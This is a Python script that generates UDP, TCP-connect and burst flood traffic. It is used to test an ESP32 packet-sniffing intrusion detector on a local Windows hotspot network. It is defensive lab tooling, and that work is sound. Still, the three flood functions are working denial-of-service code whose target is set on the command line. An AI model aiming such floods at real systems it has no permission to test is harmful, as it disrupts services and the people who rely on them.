"""
attack_generator.py
===================
Generates real attack traffic on the Windows hotspot network.
The ESP32 packet sniffer will detect this as anomalous and
mirror it to the backend via MQTT on iot/edge/attacks/#

Run this on your PC while the ESP32 is running.

Usage:
    python attack_generator.py
    python attack_generator.py --target 192.168.137.1 --duration 120
"""

import socket
import random
import time
import argparse
import threading

# ── Config ────────────────────────────────────────────────────────
TARGET_IP   = "192.168.137.1"   # Windows hotspot gateway (ESP32's broker IP)
DURATION    = 60                # seconds to run each attack phase
PACKET_SIZE = 64                # bytes per packet

# ── Stats ─────────────────────────────────────────────────────────
_sent  = 0
_lock  = threading.Lock()
_running = True


def _print_stats():
    while _running:
        time.sleep(5)
        with _lock:
            print(f"  [STATS] Packets sent: {_sent}")


# ── Attack 1: UDP Flood ───────────────────────────────────────────
def udp_flood(target_ip: str, duration: int):
    """
    High-rate UDP flood — triggers high packet_rate anomaly.
    This is the most effective at triggering Z-Score detection.
    """
    global _sent
    print(f"\n[ATTACK 1] UDP Flood → {target_ip}  ({duration}s)")
    print("  Effect: high packet_rate, high byte_rate → Z-Score spike")

    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    end  = time.time() + duration

    while time.time() < end:
        try:
            payload = random.randbytes(PACKET_SIZE)
            port    = random.randint(1024, 65535)
            sock.sendto(payload, (target_ip, port))
            with _lock:
                _sent += 1
        except Exception:
            pass

    sock.close()
    print(f"  [DONE] UDP flood complete")


# ── Attack 2: SYN-like TCP Flood ─────────────────────────────────
def tcp_flood(target_ip: str, duration: int):
    """
    Rapid TCP connection attempts — triggers conn_rej / conn_s0 anomaly.
    """
    global _sent
    print(f"\n[ATTACK 2] TCP Flood → {target_ip}  ({duration}s)")
    print("  Effect: high conn_rej, conn_s0 → anomaly score spike")

    end = time.time() + duration

    while time.time() < end:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(0.05)
            port = random.randint(1, 1024)
            sock.connect_ex((target_ip, port))
            sock.close()
            with _lock:
                _sent += 1
        except Exception:
            pass

    print(f"  [DONE] TCP flood complete")


# ── Attack 3: ICMP-like Ping Flood ───────────────────────────────
def icmp_flood(target_ip: str, duration: int):
    """
    Rapid small packet bursts — triggers proto_icmp + high packet_rate.
    """
    global _sent
    print(f"\n[ATTACK 3] Burst Flood → {target_ip}  ({duration}s)")
    print("  Effect: high packet_rate, proto anomaly → Z-Score spike")

    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    end  = time.time() + duration

    while time.time() < end:
        try:
            for _ in range(100):
                sock.sendto(b'\x00' * 32, (target_ip, 7))
            with _lock:
                _sent += 100
            time.sleep(0.001)
        except Exception:
            pass

    sock.close()
    print(f"  [DONE] Burst flood complete")


# ── Main ──────────────────────────────────────────────────────────
def main():
    ap = argparse.ArgumentParser(description="Attack traffic generator for ESP32 IDS testing")
    ap.add_argument("--target",   default=TARGET_IP,  help="Target IP (hotspot gateway)")
    ap.add_argument("--duration", type=int, default=DURATION, help="Duration per attack phase (seconds)")
    ap.add_argument("--attack",   choices=["udp", "tcp", "burst", "all"], default="all")
    args = ap.parse_args()

    global _running

    print("=" * 55)
    print("  ESP32 Attack Traffic Generator")
    print("=" * 55)
    print(f"  Target   : {args.target}")
    print(f"  Duration : {args.duration}s per phase")
    print(f"  Mode     : {args.attack}")
    print("=" * 55)
    print("\n  Watch your ESP32 serial monitor for:")
    print("  [ATTACK] Detected! → mirrored to iot/edge/attacks/#")
    print("\n  Press Ctrl+C to stop\n")

    # Start stats printer
    t = threading.Thread(target=_print_stats, daemon=True)
    t.start()

    try:
        if args.attack in ("udp", "all"):
            udp_flood(args.target, args.duration)
            time.sleep(2)

        if args.attack in ("tcp", "all"):
            tcp_flood(args.target, args.duration)
            time.sleep(2)

        if args.attack in ("burst", "all"):
            icmp_flood(args.target, args.duration)

    except KeyboardInterrupt:
        print("\n\n[STOPPED] Ctrl+C received")

    finally:
        _running = False
        with _lock:
            print(f"\n[SUMMARY] Total packets sent: {_sent}")
        print("[DONE] Check backend for attack records in esp32_realtime.xlsx")


if __name__ == "__main__":
    main()